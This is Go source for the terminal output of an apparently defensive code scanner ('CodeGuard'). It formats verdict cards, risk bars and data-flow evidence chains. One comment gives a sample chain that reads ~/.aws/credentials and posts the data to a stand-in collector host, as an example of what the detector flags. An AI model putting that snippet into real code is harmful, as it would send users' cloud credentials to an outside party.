package main

// Detailed, human-readable verdict "card" for the terminal: the same facts the web UI
// shows (verdict, risk bar with threshold, language, latency, reasons, per-category
// scores, flagged source lines). Colours only on a real terminal; NO_COLOR turns them off.

import (
	"fmt"
	"io"
	"os"
	"strings"
)

const blockThreshold = 0.5

type palette struct{ red, green, yellow, dim, bold, reset string }

func paletteFor(f *os.File) palette {
	if os.Getenv("NO_COLOR") != "" {
		return palette{}
	}
	if st, err := f.Stat(); err != nil || st.Mode()&os.ModeCharDevice == 0 || !enableConsole(f) {
		return palette{}
	}
	return palette{"\x1b[31m", "\x1b[32m", "\x1b[33m", "\x1b[2m", "\x1b[1m", "\x1b[0m"}
}

// bar draws `width` cells filled to `frac`, with an optional threshold tick.
func bar(frac float64, width int, tick float64) string {
	filled := int(frac*float64(width) + 0.5)
	if frac > 0 && filled == 0 {
		filled = 1
	}
	var b strings.Builder
	tickAt := -1
	if tick > 0 {
		tickAt = int(tick * float64(width))
	}
	for i := 0; i < width; i++ {
		switch {
		case i == tickAt:
			b.WriteString("│")
		case i < filled:
			b.WriteString("█")
		default:
			b.WriteString("░")
		}
	}
	return b.String()
}

func prettyCategory(c string) string {
	words := strings.Split(c, "_")
	for i, w := range words {
		if w == "ssrf" || w == "ai" {
			words[i] = strings.ToUpper(w)
		}
	}
	s := strings.Join(words, " ")
	return strings.ToUpper(s[:1]) + s[1:]
}

func clip(s string, n int) string {
	if r := []rune(s); len(r) > n {
		return string(r[:n-1]) + "…"
	}
	return s
}

// reasonsByCategory keeps the first (strongest) reason the engine gave for each category.
// The engine's reason string is "category: text (line N); category: text; ...".
func reasonsByCategory(reason string) map[string]string {
	out := map[string]string{}
	for _, r := range strings.Split(reason, "; ") {
		cat, text, ok := strings.Cut(r, ": ")
		if ok {
			if _, seen := out[cat]; !seen {
				out[cat] = text
			}
		}
	}
	return out
}

// supportNote returns the engine's language-support note (the reason's first clause), or "".
func supportNote(reason string) string {
	first, _, _ := strings.Cut(reason, "; ")
	if strings.HasPrefix(first, "language ") || strings.HasPrefix(first, "light (rule-based)") {
		return first
	}
	return ""
}

var roleMark = map[string]string{"source": "●", "encoded": "◆", "decoded": "◇", "carrier": "▣", "step": "○", "sink": "■", "finding": "■",
	"code": "○", "effect": "■"}

// expandSteps: a single finding (one line, no path) is drawn as that line of code -> what it does.
func expandSteps(e Evidence) []EvidenceStep {
	if len(e.Steps) != 1 {
		return e.Steps
	}
	s := e.Steps[0]
	label := "this line"
	if s.Line <= 0 {
		label = "the snippet"
	}
	return []EvidenceStep{{Line: s.Line, Role: "code", Label: label, Code: s.Code}, {Line: s.Line, Role: "effect", Label: s.Label}}
}

func hasChain(v *Verdict) bool {
	for _, e := range v.Evidence {
		if len(e.Steps) > 1 {
			return true
		}
	}
	return false
}

// printChains draws up to max evidence chains top to bottom: each step is a node (its line and the
// code on it), joined by arrows labelled with the variable the data flows through.
//
//	L2  ● reads sensitive file ~/.aws/credentials
//	    │ data = open(os.path.expanduser("~/.aws/credentials")).read()
//	    ▼ via data
//	L3  ■ sent over the network
//	    │ requests.post("https://collector.example/up", data=data)
func printChains(w io.Writer, p palette, v *Verdict, max int) {
	shown := 0
	for _, e := range v.Evidence {
		if shown == max {
			break
		}
		if max < len(v.Evidence) && len(e.Steps) < 2 && hasChain(v) {
			continue // in the short card, single findings are already listed under "why"
		}
		if shown > 0 {
			fmt.Fprintln(w) // blank line between chains, none after the last
		}
		shown++
		fmt.Fprintf(w, " %s%s%s  %s%s%s\n", p.red+p.bold, prettyCategory(e.Category), p.reset, p.dim, clip(e.Reason, 60), p.reset)
		steps := expandSteps(e)
		for i, s := range steps {
			color := p.yellow
			switch s.Role {
			case "sink", "finding", "effect":
				color = p.red
			case "code":
				color = p.dim
			}
			mark := roleMark[s.Role]
			if mark == "" {
				mark = "○"
			}
			line := "    "
			if s.Line > 0 {
				line = fmt.Sprintf("L%-3d", s.Line)
			}
			fmt.Fprintf(w, "   %s%s%s %s%s %s%s\n", p.dim, line, p.reset, color+p.bold, mark, clip(s.Label, 96), p.reset)
			if s.Code != "" && (s.Role != "decoded") {
				fmt.Fprintf(w, "        %s│ %s%s\n", p.dim, clip(s.Code, 74), p.reset)
			}
			if i < len(steps)-1 {
				via := ""
				if next := steps[i+1]; next.Via != "" {
					via = " via " + next.Via
				}
				fmt.Fprintf(w, "        %s▼%s%s\n", p.dim, via, p.reset)
			}
		}
	}
}

// printGraph: `codeguard scan --graph`, only the verdict line and every evidence chain.
func printGraph(w io.Writer, p palette, v *Verdict, name string) {
	color, mark := p.green, "✔ ALLOWED"
	if v.Verdict == "block" {
		color, mark = p.red, "✖ BLOCKED"
	}
	title := ""
	if name != "" {
		title = "  " + p.dim + clip(name, 50) + p.reset
	}
	fmt.Fprintf(w, " %s%s%s   risk %.2f   %s%s\n\n", color+p.bold, mark, p.reset, v.RiskScore, strings.Join(v.Categories, ", "), title)
	if len(v.Evidence) == 0 {
		fmt.Fprintf(w, " %sno evidence chain: %s%s\n", p.dim, clip(v.Reason, 70), p.reset)
		return
	}
	printChains(w, p, v, len(v.Evidence))
}

// printCard: the verdict in one line, one reason per blocking category, the flagged lines, and one
// line on what CodeGuard did. Only what a reviewer needs; `scan --json` has the full response.
func printCard(w io.Writer, p palette, v *Verdict, code, name string) {
	blocked := v.Verdict == "block"
	color, mark := p.green, "✔ ALLOWED"
	if blocked {
		color, mark = p.red, "✖ BLOCKED"
	}
	rule := p.dim + strings.Repeat("─", 88) + p.reset
	fmt.Fprintln(w, rule)

	// 1. verdict, risk, threshold
	fmt.Fprintf(w, " %s%s%s   risk %s%.2f%s  %s%s%s %sblock at %.2f%s\n",
		color+p.bold, mark, p.reset, p.bold, v.RiskScore, p.reset,
		color, bar(v.RiskScore, 24, blockThreshold), p.reset, p.dim, blockThreshold, p.reset)

	// 2. what was checked, how fast
	facts := []string{}
	if name != "" {
		facts = append(facts, clip(name, 40))
	}
	facts = append(facts, v.CodeLanguage)
	if v.LatencyMS > 0 {
		facts = append(facts, fmt.Sprintf("%.1f ms", v.LatencyMS))
	}
	fmt.Fprintf(w, " %s%s%s\n", p.dim, strings.Join(facts, "  ·  "), p.reset)

	// 3. why: one line per blocking category
	if blocked && len(v.Categories) > 0 {
		why := reasonsByCategory(v.Reason)
		fmt.Fprintln(w)
		for _, c := range v.Categories {
			score := v.CategoryScores[c]
			if score == 0 {
				score = v.RiskScore
			}
			text, line := why[c], ""
			if i := strings.LastIndex(text, " (line "); i >= 0 && strings.HasSuffix(text, ")") {
				text, line = text[:i], "L"+strings.TrimSuffix(text[i+7:], ")")
			}
			fmt.Fprintf(w, " %s%-22s%s %s%.2f%s  %-54s %s%s%s\n", p.red+p.bold, prettyCategory(c), p.reset,
				p.bold, score, p.reset, clip(text, 54), p.dim, line, p.reset)
		}
	} else if blocked && v.Reason != "" { // e.g. the engine was unreachable
		fmt.Fprintf(w, "\n %s%s%s\n", p.yellow, clip(v.Reason, 70), p.reset)
	} else if !blocked {
		note := "no high-risk pattern found"
		if _, caps, ok := strings.Cut(v.Reason, "capabilities seen: "); ok {
			note += "  " + p.dim + "(only harmless capabilities: " + clip(caps, 40) + ")" + p.reset
		}
		fmt.Fprintf(w, "\n %s\n", note)
	}
	if s := supportNote(v.Reason); s != "" { // light or missing language support: say so on every card
		fmt.Fprintf(w, " %s%s%s\n", p.yellow, clip(s, 90), p.reset)
	}

	// 4. how the code gets there (evidence chain), or else the flagged lines themselves
	if blocked && hasChain(v) {
		fmt.Fprintln(w)
		printChains(w, p, v, 2)
	} else if blocked && len(v.VulnerableLines) > 0 && code != "" {
		lines := strings.Split(strings.ReplaceAll(code, "\r\n", "\n"), "\n")
		fmt.Fprintln(w)
		for i, n := range v.VulnerableLines {
			if i == 5 {
				fmt.Fprintf(w, " %s     … %d more flagged line(s)%s\n", p.dim, len(v.VulnerableLines)-5, p.reset)
				break
			}
			if n >= 1 && n <= len(lines) {
				fmt.Fprintf(w, " %s%4d │%s %s\n", p.red, n, p.reset, clip(strings.TrimSpace(lines[n-1]), 62))
			}
		}
	}

	// 5. what CodeGuard did
	did := []string{"static analysis only"}
	if v.DecodedLayers > 0 {
		did = append(did, fmt.Sprintf("decoded %d hidden layer(s)", v.DecodedLayers))
	}
	if blocked {
		did = append(did, "nothing was executed")
	}
	fmt.Fprintf(w, "\n %s↳ %s%s\n", p.dim, strings.Join(did, " · "), p.reset)
	fmt.Fprintln(w, rule)
}
